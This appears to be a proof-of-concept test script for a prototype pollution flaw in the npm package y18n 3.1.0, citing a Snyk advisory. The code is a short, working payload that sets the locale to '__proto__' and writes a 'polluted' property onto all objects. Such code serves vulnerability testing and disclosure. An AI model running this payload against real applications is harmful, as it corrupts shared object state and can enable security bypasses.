// //https://snyk.io/test/npm/y18n/3.1.0

// test("prototype pollution in y18n", () => {
  const y18n = require("y18n")();
  obj = {};

console.log({}.polluted);

  //y18n.setLocale("constructor['prototype']");
  y18n.setLocale("__proto__");
  y18n.updateLocale({ polluted: "yes" }); //payload

console.log({}.polluted);
// });
